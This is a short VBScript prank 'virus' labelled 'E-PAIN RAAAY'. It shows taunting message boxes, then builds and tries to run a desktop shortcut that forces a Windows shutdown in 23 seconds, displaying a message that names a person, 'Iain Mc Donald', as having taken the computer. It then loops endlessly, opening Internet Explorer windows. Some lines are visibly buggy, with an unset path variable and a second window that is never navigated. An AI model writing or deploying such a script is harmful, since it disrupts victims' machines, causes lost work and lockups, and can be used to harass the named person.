X=msgbox("Welcome to the Iain Ray Viruz", 0+48, "E-PAIN RAAAY")
X=msgbox("Last chance to stop this program with command prompt...", 0+48, "E-PAIN RAAAY")
X=msgbox("It was nice knowing you!", 0+48, "E-PAIN RAAAY")

' Create a shortcut to shut down computer
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop")
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\Shutdown.lnk")
oShellLink.TargetPath = "shutdown.exe"
oShellLink.Arguments = "-s -t 23 -c ""Iain Mc Donald has taken your computer. It will lock in 23 seconds... It was nice knowning you. I hope you have a great day :)"""
oShellLink.Description = "Shut down the computer with a delay and message"
oShellLink.IconLocation = "shell32.dll,2"
oShellLink.Save

' Open the shortcut

Dim objShell
Dim objFSO
Dim strDesktopPath

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objShell.Run(strDesktopPath & "Shutdown.lnk")

do
Dim objIE
Set objIE = CreateObject("InternetExplorer.Application")
objIE.Navigate "https://www.google.com/search?q=let+us+in&oq=let+us+in&aqs=chrome.0.0i355i433i512j46i433i512j0i512l8.1838j0j7&sourceid=chrome&ie=UTF-8"
objIE.Visible = True
Dim objIE2
Set objIE2 = CreateObject("InternetExplorer.Application")
objIE.Navigate "https://encrypted-tbn0.gstatic.com/licensed-image?q=tbn:ANd9GcRisdJNBLznLQcXdxtaD4GSBYCWaviucAhaOpoe9tt_yC7kzGvGHtjtGMfdYynM3x-ImyQ1UjgcnmyJ1WQ"
objIE2.Visible = True
loop


